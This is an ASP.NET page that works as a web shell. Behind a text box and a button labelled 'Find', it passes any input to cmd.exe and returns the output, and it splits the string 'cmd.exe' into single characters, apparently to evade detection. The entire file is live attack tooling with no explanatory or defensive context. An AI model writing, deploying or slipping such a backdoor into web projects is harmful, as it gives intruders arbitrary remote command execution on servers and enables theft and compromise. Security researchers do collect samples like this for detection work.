<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<html>
<body>
    <form id="formCommand" runat="server">
    <div>
        <table>
            <tr>
                <td><asp:TextBox ID="t" runat="server" Width="500px"></asp:TextBox></td>
            </tr>
	    <tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="btnExecute" runat="server" OnClick="btn_Click" Text="Find" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>

<script runat="server">
    protected void btn_Click(object sender, EventArgs e)
    {
			
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.b(t.Text)));
        Response.Write("</pre>");
    }

    private string b(string name)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "c" + "m" + "d" + "." + "e" +  "x" + "e";
            processStartInfo.Arguments = "/c " + name;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>